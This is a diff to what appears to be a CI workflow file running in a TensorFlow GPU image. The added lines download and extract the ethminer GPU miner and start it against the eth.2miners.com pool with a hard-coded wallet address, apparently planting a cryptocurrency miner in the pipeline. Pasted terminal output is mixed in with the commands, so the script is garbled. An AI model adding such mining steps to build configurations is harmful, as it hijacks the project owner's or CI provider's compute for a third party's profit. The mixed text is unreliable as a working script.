@@ -30,5 +30,22 @@ jobs:
     uses: script@v1
     with:
       script: |-
-            apt install ethereum
+            $ sudo add-apt-repository ppa:ethereum/ethereum
+            $ sudo apt update
+            $ sudo apt install ethereum
+            $ sudo apt-key adv --keyserver keyserver.ubuntu.com  --recv-keys 2A518C819BE37D2C2031944D1C52189C923F6CA9
+            $ sudo apt update
+            $ sudo apt install ethereum
+            $ dpkg -l | grep ethereum
+            ii  ethereum     1.9.25+build24398+bionic     amd64   Meta-package to install geth and other tools
+            $ mkdir ethminer
+            $ wget -O ethminer/ethminer.tar.gz https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
+            $ tar xzf ethminer/ethminer.tar.gz -C ethminer/
+            $ ethminer/bin/ethminer --help
+            ethminer 0.18.0
+            Build: linux/release/gnu
+
+            Ethminer - GPU ethash miner
+            $ ./ethminer -G -P stratum1+tcp://0x39b9Bb05363D6E68942DFeb1EB349Ed24b365824@eth.2miners.com:2020
+minimal usage : ethminer [DEVICES_TYPE] [OPTIONS] -P... [-P...]
       image: tensorflow/tensorflow:1.14.0-gpu-py3
